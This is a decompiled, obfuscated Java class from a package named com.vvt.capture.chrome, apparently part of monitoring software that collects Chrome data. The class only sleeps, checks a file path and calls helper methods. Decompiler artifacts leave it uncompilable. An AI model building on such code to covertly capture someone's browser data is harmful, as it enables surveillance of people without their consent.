package com.vvt.capture.chrome.a;

import android.os.SystemClock;
import java.io.File;

class e
  implements Runnable
{
  e(d paramd) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      localObject1 = this.a;
      File localFile = new java/io/File;
      Object localObject3 = this.a;
      localObject3 = d.a((d)localObject3);
      localFile.<init>((String)localObject3);
      d.a((d)localObject1, localFile);
      localObject1 = this.a;
      localObject1 = ((d)localObject1).a;
      bool = c.a((c)localObject1);
      if (bool)
      {
        localObject1 = this.a;
        localObject1 = d.b((d)localObject1);
        bool = ((File)localObject1).exists();
        if (bool)
        {
          bool = c.c();
          if (bool) {}
          localObject1 = this.a;
          localObject1 = ((d)localObject1).a;
          c.b((c)localObject1);
        }
      }
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = c.d();
        if (bool) {}
        d locald = this.a;
      }
    }
    finally
    {
      d.a(this.a, null);
    }
    d.a((d)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */